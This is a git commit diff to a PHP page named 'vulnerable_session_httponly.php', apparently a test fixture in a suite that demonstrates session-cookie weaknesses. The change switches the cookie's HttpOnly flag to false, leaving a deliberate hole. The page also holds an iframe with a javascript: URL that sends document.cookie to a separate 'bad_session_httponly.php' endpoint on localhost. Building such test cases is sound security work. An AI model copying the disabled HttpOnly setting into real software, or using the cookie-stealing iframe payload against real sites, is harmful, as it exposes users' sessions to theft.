cd3fdd9686a227833edc9cbc74eaf320f46b5eac
IoALFANO <54988405+IoALFANO@users.noreply.github.com>
2021-10-14 14:21:35 +0200

    Update vulnerable_session_httponly.php

--- session/vulnerable_session_httponly.php
+++ session/vulnerable_session_httponly.php
@@ -3,7 +3,7 @@
 <title>Vulnerable : Session Cookie HttpOnly</title>
 </head>
 <body>
-<?php setcookie('value', 'secret_cookie', "", "", "", "", true); ?>
+<?php setcookie('value', 'secret_cookie', "", "", "", "", false); ?>
 <iframe src="javascript:document.location='http://localhost:8089/bad_session_httponly.php?cookie='+document.cookie"></iframe>
 </body>
 </html>
